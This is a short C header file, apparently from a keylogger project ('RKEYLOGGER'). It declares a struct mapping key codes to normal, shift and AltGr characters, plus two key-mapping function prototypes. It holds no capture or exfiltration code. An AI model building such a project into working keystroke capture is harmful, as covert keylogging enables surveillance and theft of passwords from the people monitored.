#ifndef __RKEYLOGGER_MAP_CODE__
#define __RKEYLOGGER_MAP_CODE__

    #include "utils.h" 

    struct KeyValue{ 
        const char* normal; 
        const char* shift; 
        const char* altgr; 
    };

    ProcesssResponse map_code(int code, int value);
    ProcesssResponse emit_code(int code);
#endif